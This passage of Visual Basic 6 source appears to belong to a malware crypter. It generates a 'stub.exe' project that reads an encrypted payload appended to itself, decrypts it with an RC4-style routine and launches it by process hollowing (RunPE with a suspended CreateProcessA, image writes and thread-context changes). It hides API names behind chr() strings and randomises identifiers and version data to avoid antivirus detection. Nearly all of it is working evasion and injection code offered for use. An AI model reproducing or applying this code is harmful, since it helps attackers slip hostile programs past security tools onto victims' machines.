  txt = txt & Chr$(ch + Asc("a"))
  Else
  ch = ch - 26 - 26
  txt = txt & Chr$(ch + Asc("0"))
  End If
  Next i
  lRan = txt
End Function

Public Function Encryption() As String
Encryption = "Public Function " & Text1(8).Text & "(ByVal " & Text1(9).Text & " As String, ByVal " & Text1(10).Text & " As String) As String" & vbNewLine & _
"On Error Resume Next" & vbNewLine & _
"Dim " & Text1(11).Text & "(0 To 255) As Integer, " & Text1(12).Text & "," & Text1(13).Text & " As Long, " & Text1(14).Text & "() As Byte" & vbNewLine & _
Text1(14).Text() & " = StrConv(" & Text1(10).Text & ", vbFromUnicode)" & vbNewLine & _
"For " & Text1(12).Text & " = 0 To 255" & vbNewLine & _
    Text1(13).Text & " = (" & Text1(13).Text & "+" & Text1(11).Text & "(" & Text1(12).Text & ")" & "+" & Text1(14).Text & "(" & Text1(12).Text & " Mod Len(" & Text1(10).Text & "))) Mod 256" & vbNewLine & _
    Text1(11).Text & "(" & Text1(12).Text & ") = " & Text1(12).Text & vbNewLine & _
"Next " & Text1(12).Text & vbNewLine & _
Text1(14).Text & "() = StrConv(" & Text1(9).Text & ", vbFromUnicode)" & vbNewLine & _
"For " & Text1(12).Text & " = 0 To Len(" & Text1(9).Text & ")" & vbNewLine & _
    Text1(13).Text & " = (" & Text1(13).Text & "+" & Text1(11).Text & "(" & Text1(13).Text & ") + 1) Mod 256" & vbNewLine & _
    Text1(14).Text & "(" & Text1(12).Text & ") = " & Text1(14).Text & "(" & Text1(12).Text & ") Xor " & Text1(11).Text & "( Temp + " & Text1(11).Text & "((" & Text1(13).Text & " + " & Text1(11).Text & "(" & Text1(13).Text & ")) Mod 254))" & vbNewLine & _
"Next " & Text1(12).Text & vbNewLine & _
Text1(8).Text & " = StrConv(" & Text1(14).Text & ", vbUnicode)" & vbNewLine & _
"End Function"

End Function

Private Function ProjectFile() As String
X = """"
ProjectFile = "Type=Exe" & vbNewLine & _
"Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\..\Windows\system32\stdole2.tlb#OLE Automation" & vbNewLine & _
"Module=" & Text1(3).Text & "; " & Text1(3).Text & ".bas" & vbNewLine & _
"Module=" & Text1(25).Text & "; " & Text1(25).Text & ".bas" & vbNewLine & _
"Startup" & " = " & X & "Sub Main" & X & vbNewLine & _
"Title = " & X & lRan(RandomNumber) & vbNewLine & _
"ExeName32 =stub.exe" & vbNewLine & _
"Path32 = " & X & ".." & vbNewLine & _
"Command32 = " & X & "" & vbNewLine & _
"Name = " & X & lRan(RandomNumber) & vbNewLine & _
"CompatibleMode = " & X & "0" & vbNewLine & _
"MajorVer = " & X & RandomNumber & vbNewLine & _
"MinorVer = " & X & RandomNumber & vbNewLine & _
"RevisionVer = " & X & RandomNumber & vbNewLine & _
"AutoIncrementVer = 0" & vbNewLine & _
"ServerSupportFiles = 0" & vbNewLine & _
"VersionCompanyName = " & X & lRan(RandomNumber) & vbNewLine & _
"OptimizationType = 0" & vbNewLine & _
"FavorPentiumPro(tm) = 0" & vbNewLine & _
"CodeViewDebugInfo = 0" & vbNewLine & _
"NoAliasing = 0" & vbNewLine & _
"BoundsCheck = 0" & vbNewLine & _
"OverflowCheck = 0"
ProjectFile = ProjectFile & vbNewLine & _
"FlPointCheck = 0" & vbNewLine & _
"FDIVCheck = 0" & vbNewLine & _
"UnroundedFP = 0" & vbNewLine & _
"StartMode = 0" & vbNewLine & _
"Unattended = 0" & vbNewLine & _
"Retained = 0" & vbNewLine & _
"ThreadPerObject = 0" & vbNewLine & _
"MaxNumberOfThreads = 1"


End Function


Private Function MainModule() As String
X = """"
MainModule = " 'Main modules " & vbCrLf & _
"Attribute VB_Name = " & X & Text1(3).Text & X & vbCrLf & _
"Public Declare Sub CopyBytes Lib " & X & "msvbvm60" & X & " Alias " & X & "__vbaCopyBytes" & X & " (ByVal Length As Long, Destination As Any, Source As Any)" & vbNewLine & _
"Sub Main() " & vbNewLine & _
"Call " & Text1(55).Text & vbNewLine & _
"End Sub" & vbNewLine

MainModule = MainModule & "Private Function " & Text1(56).Text & "() " & vbNewLine & _
"Dim " & Text1(0).Text & " As String" & vbNewLine & _
Text1(0).Text & " = App.Path & " & X & "\" & X & " & App.EXEName & " & X & ".exe" & X & vbNewLine & _
"Dim " & Text1(1).Text & " As String" & vbNewLine & _
"Open " & Text1(0).Text & " For Binary As #1" & vbNewLine & _
Text1(1).Text & " = Space(LOF(1))" & vbNewLine & _
"Get #1, , " & Text1(1).Text & vbNewLine & _
"Close #1 " & vbNewLine & _
"Dim " & Text1(2).Text() & "() As String" & vbNewLine & _
Text1(2).Text() & "() = Split(" & Text1(1).Text & ", " & X & Text1(4).Text & X & ")" & vbNewLine & _
Text1(2).Text & "(1) = " & Text1(8).Text & "(" & Text1(2).Text & "(1) , " & X & Text1(5).Text & X & ")" & vbNewLine & _
"Call " & Text1(27).Text & "(" & Text1(0).Text & ", StrConv(" & Text1(2).Text & "(1), vbFromUnicode), vbNullString)" & vbNewLine & _
"end function" & vbNewLine

MainModule = MainModule & "Private Function " & Text1(55).Text & "() " & vbNewLine & _
"dim " & Text1(58).Text & " as integer," & Text1(57).Text & " as string" & vbNewLine & _
"for " & Text1(58).Text & " = 0 to 0" & vbNewLine & _
"if not " & Text1(57).Text & " = " & X & "" & X & "then" & vbNewLine & _
Text1(1).Text & " = Space(LOF(1))" & vbNewLine & _
Text1(57).Text & " = " & X & "3421" & X & vbNewLine & _
"else" & vbNewLine & _
"Call " & Text1(56).Text & vbNewLine & _
"end if" & vbNewLine & _
"next " & Text1(58).Text & vbNewLine & _
"end function" & vbNewLine

End Function

Function Encry(MyString As String, MyPassword As String) As String
Dim PWMutex
Dim TempString
For i = 1 To Len(MyPassword)
PWMutex = PWMutex & Asc(Mid(MyPassword, i, 1))
Next i
PWMutex = PWMutex - (255 * Fix((PWMutex / 255)))
For i = 1 To Len(MyString)
If (Asc(Mid(MyString, i, 1)) + PWMutex) > 255 Then
TempString = TempString & Chr((Asc(Mid(MyString, i, 1)) + PWMutex) - 255)
Else
TempString = TempString & Chr((Asc(Mid(MyString, i, 1)) + PWMutex))
End If
Next i
Encry = TempString
End Function

Private Function RunPE() As String
X = """"
RunPE = "Attribute VB_Name = " & Text1(25).Text & vbNewLine & _
"Option Explicit" & vbNewLine & _
"Private Const CONTEXT_FULL As Long = &H10007" & vbNewLine & _
"Private Const MAX_PATH As Integer = 260" & vbNewLine & _
"Private Const CREATE_SUSPENDED As Long = &H4" & vbNewLine & _
"Private Const MEM_COMMIT As Long = &H1000" & vbNewLine & _
"Private Const MEM_RESERVE As Long = &H2000" & vbNewLine & _
"Private Const PAGE_EXECUTE_READWRITE As Long = &H40" & vbNewLine & _
"" & vbNewLine & _
"Public Declare Function CreateProcessA Lib " & X & "kernel32" & X & " (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As " & Text1(52).Text & ", lpProcessInformation As " & Text1(53).Text & ") As Long" & vbNewLine & _
"" & vbNewLine & _
"Public Declare Function CallWindowProcA Lib " & X & "user32" & X & " (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long" & vbNewLine & _
"Public Declare Function GetProcAddress Lib " & X & "kernel32" & X & " (ByVal hModule As Long, ByVal lpProcName As String) As Long " & vbNewLine & _
"Public Declare Function LoadLibraryA Lib " & X & "kernel32" & X & " (ByVal lpLibFileName As String) As Long" & vbNewLine & _
"Private Type SECURITY_ATTRIBUTES" & vbNewLine & _
"nLength As Long" & vbNewLine & _
"lpSecurityDescriptor As Long" & vbNewLine & _
"bInheritHandle As Long" & vbNewLine & _
"End Type" & vbNewLine

RunPE = RunPE & vbNewLine & _
"Private Type " & Text1(52).Text & vbNewLine & _
"cb As Long" & vbNewLine & _
"lpReserved As Long" & vbNewLine & _
"lpDesktop As Long" & vbNewLine & _
"lpTitle As Long" & vbNewLine & _
"dwX As Long" & vbNewLine & _
"dwY As Long" & vbNewLine & _
"dwXSize As Long" & vbNewLine & _
"dwYSize As Long" & vbNewLine & _
"dwXCountChars As Long" & vbNewLine & _
"dwYCountChars As Long" & vbNewLine & _
"dwFillAttribute As Long" & vbNewLine & _
"dwFlags As Long" & vbNewLine & _
"wShowWindow As Integer" & vbNewLine & _
"cbReserved2 As Integer" & vbNewLine & _
"lpReserved2 As Long" & vbNewLine & _
"hStdInput As Long" & vbNewLine & _
"hStdOutput As Long" & vbNewLine & _
"hStdError As Long" & vbNewLine & _
"End Type" & vbNewLine

RunPE = RunPE & vbNewLine & _
"Private Type " & Text1(53).Text & vbNewLine & _
"hProcess As Long" & vbNewLine & _
"hThread As Long" & vbNewLine & _
"dwProcessId As Long" & vbNewLine & _
"dwThreadID As Long" & vbNewLine & _
"End Type" & vbNewLine

RunPE = RunPE & vbNewLine & _
"Private Type FLOATING_SAVE_AREA" & vbNewLine & _
"ControlWord As Long" & vbNewLine & _
"StatusWord As Long" & vbNewLine & _
"TagWord As Long" & vbNewLine & _
"ErrorOffset As Long" & vbNewLine & _
"ErrorSelector As Long" & vbNewLine & _
"DataOffset As Long" & vbNewLine & _
"DataSelector As Long" & vbNewLine & _
"RegisterArea(1 To 80) As Byte" & vbNewLine & _
"Cr0NpxState As Long" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & Text1(54).Text & vbNewLine & _
"ContextFlags As Long" & vbNewLine & _
"Dr0 As Long" & vbNewLine & _
"Dr1 As Long" & vbNewLine & _
"Dr2 As Long" & vbNewLine & _
"Dr3 As Long" & vbNewLine & _
"Dr6 As Long" & vbNewLine & _
"Dr7 As Long" & vbNewLine

RunPE = RunPE & vbNewLine & _
"FloatSave As FLOATING_SAVE_AREA" & vbNewLine & _
"SegGs As Long" & vbNewLine & _
"SegFs As Long" & vbNewLine & _
"SegEs As Long" & vbNewLine & _
"SegDs As Long" & vbNewLine & _
"Edi As Long" & vbNewLine & _
"Esi As Long" & vbNewLine & _
"Ebx As Long" & vbNewLine & _
"Edx As Long" & vbNewLine & _
"Ecx As Long" & vbNewLine & _
"Eax As Long" & vbNewLine & _
"Ebp As Long" & vbNewLine & _
"Eip As Long" & vbNewLine & _
"SegCs As Long" & vbNewLine & _
"EFlags As Long" & vbNewLine & _
"Esp As Long" & vbNewLine & _
"SegSs As Long" & vbNewLine & _
"End Type" & vbNewLine

RunPE = RunPE & vbNewLine & _
"Private Type " & Text1(35).Text & vbNewLine & _
"e_magic As Integer" & vbNewLine & _
"e_cblp As Integer" & vbNewLine & _
"e_cp As Integer" & vbNewLine & _
"e_crlc As Integer" & vbNewLine & _
"e_cparhdr As Integer" & vbNewLine & _
"e_minalloc As Integer" & vbNewLine & _
"e_maxalloc As Integer" & vbNewLine & _
"e_ss As Integer" & vbNewLine & _
"e_sp As Integer" & vbNewLine & _
"e_csum As Integer" & vbNewLine & _
"e_ip As Integer" & vbNewLine & _
"e_cs As Integer" & vbNewLine & _
"e_lfarlc As Integer" & vbNewLine & _
"e_ovno As Integer" & vbNewLine & _
"e_res(0 To 3) As Integer" & vbNewLine & _
"e_oemid As Integer" & vbNewLine & _
"e_oeminfo As Integer" & vbNewLine & _
"e_res2(0 To 9) As Integer" & vbNewLine & _
"e_lfanew As Long" & vbNewLine & _
"End Type" & vbNewLine
 
RunPE = RunPE & vbNewLine & _
"Private Type " & Text1(36).Text & vbNewLine & _
"Machine As Integer" & vbNewLine & _
"NumberOfSections As Integer" & vbNewLine & _
"TimeDateStamp As Long" & vbNewLine & _
"PointerToSymbolTable As Long" & vbNewLine & _
"NumberOfSymbols As Long" & vbNewLine & _
"SizeOfOptionalHeader As Integer" & vbNewLine & _
"characteristics As Integer" & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type IMAGE_DATA_DIRECTORY" & vbNewLine & _
"VirtualAddress As Long" & vbNewLine & _
"Size As Long" & vbNewLine & _
"End Type" & vbNewLine

RunPE = RunPE & vbNewLine & _
"Private Type " & Text1(37).Text & vbNewLine & _
"Magic As Integer" & vbNewLine & _
"MajorLinkerVersion As Byte" & vbNewLine & _
"MinorLinkerVersion As Byte" & vbNewLine & _
"SizeOfCode As Long" & vbNewLine & _
"SizeOfInitializedData As Long" & vbNewLine & _
"SizeOfUnitializedData As Long" & vbNewLine & _
"AddressOfEntryPoint As Long" & vbNewLine & _
"BaseOfCode As Long" & vbNewLine & _
"BaseOfData As Long" & vbNewLine & _
"' NT additional fields." & vbNewLine & _
"ImageBase As Long" & vbNewLine & _
"SectionAlignment As Long" & vbNewLine & _
"FileAlignment As Long" & vbNewLine & _
"MajorOperatingSystemVersion As Integer" & vbNewLine & _
"MinorOperatingSystemVersion As Integer" & vbNewLine & _
"MajorImageVersion As Integer" & vbNewLine & _
"MinorImageVersion As Integer" & vbNewLine & _
"MajorSubsystemVersion As Integer"
RunPE = RunPE & vbNewLine & _
"MinorSubsystemVersion As Integer" & vbNewLine & _
"W32VersionValue As Long" & vbNewLine & _
"SizeOfImage As Long" & vbNewLine & _
"SizeOfHeaders As Long" & vbNewLine & _
"CheckSum As Long" & vbNewLine & _
"SubSystem As Integer" & vbNewLine & _
"DllCharacteristics As Integer" & vbNewLine & _
"SizeOfStackReserve As Long" & vbNewLine & _
"SizeOfStackCommit As Long" & vbNewLine & _
"SizeOfHeapReserve As Long" & vbNewLine & _
"SizeOfHeapCommit As Long" & vbNewLine & _
"LoaderFlags As Long" & vbNewLine & _
"NumberOfRvaAndSizes As Long" & vbNewLine & _
"DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY" & vbNewLine & _
"End Type" & vbNewLine

RunPE = RunPE & vbNewLine & _
"Private Type " & Text1(50).Text & vbNewLine & _
"Signature As Long" & vbNewLine & _
"FileHeader As " & Text1(36).Text & vbNewLine & _
"OptionalHeader As " & Text1(37).Text & vbNewLine & _
"End Type" & vbNewLine & _
"Private Type " & Text1(51).Text & vbNewLine & _
"SecName As String * 8" & vbNewLine & _
"VirtualSize As Long" & vbNewLine & _
"VirtualAddress As Long" & vbNewLine & _
"SizeOfRawData As Long" & vbNewLine & _
"PointerToRawData As Long" & vbNewLine & _
"PointerToRelocations As Long" & vbNewLine & _
"PointerToLinenumbers As Long" & vbNewLine & _
"NumberOfRelocations As Integer" & vbNewLine & _
"NumberOfLinenumbers As Integer" & vbNewLine & _
"characteristics As Long" & vbNewLine & _
"End Type" & vbNewLine

RunPE = RunPE & vbNewLine & _
"Sub " & Text1(27).Text & "(ByVal " & Text1(28).Text & " As String, ByRef " & Text1(29).Text & "() As Byte, " & Text1(30).Text & " As String)" & vbNewLine & _
"Dim i As Long" & vbNewLine & _
"Dim " & Text1(31).Text & " As " & Text1(35).Text & vbNewLine & _
"Dim " & Text1(32).Text & " As " & Text1(50).Text & vbNewLine & _
"Dim " & Text1(33).Text & " As " & Text1(51).Text & vbNewLine & _
"Dim " & Text1(38).Text & " As " & Text1(52).Text & vbNewLine & _
"Dim " & Text1(39).Text & " As " & Text1(53).Text & vbNewLine & _
"Dim " & Text1(34).Text & " As " & Text1(54).Text & vbNewLine & _
Text1(38).Text & ".cb = Len(" & Text1(38).Text & ")" & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(23).Text) & "," & X & Text1(24).Text & X & ")" & "," & Text1(8).Text & "(" & StringtoChar(Text1(15).Text) & "," & X & Text1(24).Text & X & ")" & ", VarPtr(" & Text1(31).Text & "), VarPtr(" & Text1(29).Text & "(0)), 64" & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(23).Text) & "," & X & Text1(24).Text & X & ")" & "," & Text1(8).Text & "(" & StringtoChar(Text1(15).Text) & "," & X & Text1(24).Text & X & ")" & ", VarPtr(" & Text1(32).Text & "), VarPtr(" & Text1(29).Text & "(" & Text1(31).Text & ".e_lfanew)), 248" & vbNewLine & _
"CreateProcessA " & Text1(28).Text & ", " & X & X & " & " & Text1(30).Text & ", 0, 0, False, CREATE_SUSPENDED, 0, 0, " & Text1(38).Text & ", " & Text1(39).Text & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(16).Text) & "," & X & Text1(24).Text & X & ")" & "," & Text1(8).Text & "(" & StringtoChar(Text1(17).Text) & "," & X & Text1(24).Text & X & ")" & ", " & Text1(39).Text & ".hProcess, " & Text1(32).Text & ".OptionalHeader.ImageBase" & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(23).Text) & "," & X & Text1(24).Text & X & ")" & "," & Text1(8).Text & "(" & StringtoChar(Text1(18).Text) & "," & X & Text1(24).Text & X & ")" & ", " & Text1(39).Text & ".hProcess, " & Text1(32).Text & ".OptionalHeader.ImageBase, " & Text1(32).Text & ".OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE" & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(23).Text) & "," & X & Text1(24).Text & X & ")" & "," & Text1(8).Text & "(" & StringtoChar(Text1(19).Text) & "," & X & Text1(24).Text & X & ")" & ", " & Text1(39).Text & ".hProcess, " & Text1(32).Text & ".OptionalHeader.ImageBase, VarPtr(" & Text1(29).Text & "(0)), " & Text1(32).Text & ".OptionalHeader.SizeOfHeaders, 0" & vbNewLine & _
"For i = 0 To " & Text1(32).Text & ".FileHeader.NumberOfSections - 1" & vbNewLine & _
"CopyBytes Len(" & Text1(33).Text & " ), " & Text1(33).Text & " , " & Text1(29).Text & "(" & Text1(31).Text & ".e_lfanew + 248 + 40 * i) " & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(23).Text) & "," & X & Text1(24).Text & X & ")" & "," & Text1(8).Text & "(" & StringtoChar(Text1(19).Text) & "," & X & Text1(24).Text & X & ")" & ", " & Text1(39).Text & ".hProcess, " & Text1(32).Text & ".OptionalHeader.ImageBase + " & Text1(33).Text & ".VirtualAddress, VarPtr(" & Text1(29).Text & "(" & Text1(33).Text & ".PointerToRawData)), " & Text1(33).Text & ".SizeOfRawData, 0" & vbNewLine & _
"Next i" & vbNewLine

RunPE = RunPE & vbNewLine & _
Text1(34).Text & ".ContextFlags = CONTEXT_FULL" & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(23).Text) & "," & X & Text1(24).Text & X & ")," & Text1(8).Text & "(" & StringtoChar(Text1(20).Text) & "," & X & Text1(24).Text & X & ")" & ", " & Text1(39).Text & ".hThread, VarPtr(" & Text1(34).Text & ")" & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(23).Text) & "," & X & Text1(24).Text & X & ")," & Text1(8).Text & "(" & StringtoChar(Text1(19).Text) & "," & X & Text1(24).Text & X & ")" & ", " & Text1(39).Text & ".hProcess, " & Text1(34).Text & ".Ebx + 8, VarPtr(" & Text1(32).Text & ".OptionalHeader.ImageBase), 4, 0" & vbNewLine & _
Text1(34).Text & ".Eax = " & Text1(32).Text & ".OptionalHeader.ImageBase + " & Text1(32).Text & ".OptionalHeader.AddressOfEntryPoint" & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(23).Text) & "," & X & Text1(24).Text & X & ")," & Text1(8).Text & "(" & StringtoChar(Text1(21).Text) & "," & X & Text1(24).Text & X & ")" & ", " & Text1(39).Text & ".hThread, VarPtr(" & Text1(34).Text & ")" & vbNewLine & _
Text1(26).Text & " " & Text1(8).Text & "(" & StringtoChar(Text1(23).Text) & "," & X & Text1(24).Text & X & ")," & Text1(8).Text & "(" & StringtoChar(Text1(22).Text) & "," & X & Text1(24).Text & X & ")" & ", " & Text1(39).Text & ".hThread" & vbNewLine & _
"End Sub" & vbNewLine

RunPE = RunPE & vbNewLine & _
"Public Function " & Text1(40).Text & "(ByVal " & Text1(49).Text & " As String) As Byte()" & vbNewLine & _
"Dim i As Long" & vbNewLine & _
"Dim Buffer() As Byte" & vbNewLine & _
"ReDim Buffer(Len(" & Text1(49).Text & ") - 1)" & vbNewLine & _
"For i = 1 To Len(" & Text1(49).Text & ")" & vbNewLine & _
"Buffer(i - 1) = Asc(Mid(" & Text1(49).Text & ", i, 1))" & vbNewLine & _
"Next i" & vbNewLine & _
Text1(40).Text & " = Buffer" & vbNewLine & _
"End Function" & vbNewLine & _
"Public Function " & Text1(41).Text & "() As String" & vbNewLine & _
"Dim lRet As Long" & vbNewLine & _
"Dim " & Text1(29).Text & "(255) As Byte" & vbNewLine & _
"lRet = " & Text1(26).Text & "( " & Text1(8).Text & "(" & X & Text1(23).Text & X & "," & X & Text1(24).Text & X & ")," & Text1(8).Text & "(" & X & Text1(42).Text & X & "," & X & Text1(24).Text & X & ")" & ", App.hInstance, VarPtr(" & Text1(29).Text & "(0)), 256)" & vbNewLine & _
Text1(41).Text & " = Left$(StrConv(" & Text1(29).Text & ", vbUnicode), lRet)" & vbNewLine & _
"End Function" & vbNewLine

End Function

Public Function CallApiByName() As String
X = """"
CallApiByName = "Public Function " & Text1(26).Text & " (ByVal " & Text1(46).Text & " As String, ByVal " & Text1(47).Text & " As String, ParamArray " & Text1(48).Text & "()) As Long" & vbNewLine & _
    "Dim " & Text1(43).Text & "(64)   As Byte" & vbNewLine & _
    "Dim i           As Long" & vbNewLine & _
    "Dim " & Text1(44).Text & "        As Long" & vbNewLine & _
    "Dim " & Text1(45).Text & "        As String" & vbNewLine & _
    Text1(43).Text & "(0) = &H58: " & Text1(43).Text & "(1) = &H59: " & Text1(43).Text & "(2) = &H59" & vbNewLine & _
    Text1(43).Text & "(3) = &H59: " & Text1(43).Text & "(4) = &H59: " & Text1(43).Text & "(5) = &H50" & vbNewLine & _
    Text1(44).Text & " = 6" & vbNewLine & _
    "For i = UBound(" & Text1(48).Text & ") To 0 Step -1" & vbNewLine & _
    Text1(43).Text & "(" & Text1(44).Text & ") = &H68: " & Text1(44).Text & " = " & Text1(44).Text & " + 1" & vbNewLine & _
    Text1(45).Text & " = (" & Text1(48).Text & "(i)): GoSub PutLong: " & Text1(44).Text & " = " & Text1(44).Text & " + 4" & vbNewLine & _
    "Next" & vbNewLine & _
    Text1(43).Text & "(" & Text1(44).Text & ") = &HE8: " & Text1(44).Text & " = " & Text1(44).Text & " + 1" & vbNewLine & _
    Text1(45).Text & " = GetProcAddress(LoadLibraryA(" & Text1(46).Text & "), " & Text1(47).Text & ") - VarPtr(" & Text1(43).Text & "(" & Text1(44).Text & ")) - 4" & vbNewLine & _
    "GoSub PutLong: " & Text1(44).Text & " = " & Text1(44).Text & " + 4" & vbNewLine & _
    Text1(43).Text & "(" & Text1(44).Text & ") = &HC3" & vbNewLine
    CallApiByName = CallApiByName & Text1(26).Text & " = CallWindowProcA(VarPtr(" & Text1(43).Text & "(0)), 0, 0, 0, 0)" & vbNewLine & _
    "Exit Function" & vbNewLine & _
"PutLong:" & vbNewLine & _
    Text1(45).Text & " = Right$(String(8," & X & "0" & X & ") & Hex(" & Text1(45).Text & "), 8)" & vbNewLine & _
    Text1(43).Text & "(" & Text1(44).Text & " + 0) = (" & X & "&h" & X & " & Mid$(" & Text1(45).Text & ", 7, 2))" & vbNewLine & _
    Text1(43).Text & "(" & Text1(44).Text & " + 1) = (" & X & "&h" & X & " & Mid$(" & Text1(45).Text & ", 5, 2))" & vbNewLine & _
    Text1(43).Text & "(" & Text1(44).Text & " + 2) = (" & X & "&h" & X & " & Mid$(" & Text1(45).Text & ", 3, 2))" & vbNewLine & _
    Text1(43).Text & "(" & Text1(44).Text & " + 3) = (" & X & "&h" & X & " & Mid$(" & Text1(45).Text & ", 1, 2))" & vbNewLine & _
    "Return" & vbNewLine & _
"End Function" & vbNewLine

End Function

Private Sub Form_Load()
Text1(24).Text = RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & lRandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter & RandomNumber & RandomLetter & RandomLetter 'RC4 Key
End Sub

Function StringtoChar(Text As String)
Dim tmp As String, Data As String
tmp = Len(Text)
For i = 1 To tmp
Data = Data & "chr(" & Asc(Mid(Text, i, 1)) & ")" & " &  "
Next i
StringtoChar = Left(Data, Len(Data) - 3)
End Function
